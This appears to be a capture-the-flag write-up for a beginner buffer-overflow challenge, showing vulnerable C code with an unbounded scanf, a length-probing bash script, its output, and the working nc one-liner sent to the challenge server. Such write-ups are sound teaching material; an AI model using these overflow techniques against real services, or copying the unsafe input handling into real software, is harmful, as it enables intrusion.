# bof1
**Category:** Pwn

**Points:** 5

**Description:**

Author: kablaa

Pwn that buffer!

`nc ctf.hackucf.org 9000`

> **Files:** bof1, bof1.c, libpwnableharness64.so

**Write-up**
This is a buffer overflow challenge, and the code file was provided.

Looking at the code the important function seemed to be `handle_connection()` as it contains a `scanf()` call into a buffer of 32 chars:
```c
void handle_connection(int sock) {
	int admin = 0;
	char buf[32];
	
	scanf("%s", buf);
	
	if(admin) {
		win();
	}
	else {
		puts("nope!");
	}
}
```

When the program runs it waits for input at this point, and overflowing the buffer may give a result. At first I tried overrunning by a single byte.
Initial I was typing by hand, but the realised Python could help with this:
```bash
> python -c "print ('A' * 33)" | ./bof1
nope!
```

This has no effect on the program and I decided to try overflowing until the program segmented as this can sometimes guide you as to where the function return address is. I created a script:
```bash
#!/bin/bash
for i in {33..100}
do
  output=$(python -c "print ('A' * $i)" | ./bof)
  echo "For $i output is $output"
done
```

I found that when the script hit 45 (and after), a different message was output:
```bash
> ./overflow.sh
For 33 output is nope!
For 34 output is nope!
For 35 output is nope!
For 36 output is nope!
For 37 output is nope!
For 38 output is nope!
For 39 output is nope!
For 40 output is nope!
For 41 output is nope!
For 42 output is nope!
For 43 output is nope!
For 44 output is nope!
For 45 output is error, contact admin
For 46 output is error, contact admin
For 47 output is error, contact admin
For 48 output is error, contact admin
For 49 output is error, contact admin
For 50 output is error, contact admin
...
```
I realised this was getting into the `win()` function, but didn't understand why it reported an error (the code shows this error is reported when the flag file was missing)
After spending a while thinking there must be more to the solution, eventually I realised it was just that I wasn't running on the server, so now ran:
```bash
> python -c "print('A' * 45)" | nc ctf.hackucf.org 9000
```

This worked, and gave me the flag.
